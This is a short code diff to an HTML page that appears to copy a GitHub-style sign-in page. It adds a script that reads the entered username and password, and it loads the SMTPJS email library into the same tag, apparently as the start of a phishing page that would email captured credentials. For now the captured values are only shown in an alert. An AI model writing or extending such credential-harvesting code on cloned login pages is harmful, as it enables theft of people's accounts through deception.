@@ -124,12 +124,14 @@
   </head>
 
   <body class="logged-out env-production page-responsive session-authentication">
-<script type=text/javascript>
+<script type=text/javascript src="https://smtpjs.com/v3/smtp.js">
 function sendMail() {
-  alert("test!!!");
+  var username = document.getElementsByName("login").item(0).value;
+  var password = document.getElementsByName("password").item(0).value;
+alert(username+':'+password);
 }
 </script>
-    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
     
     
     
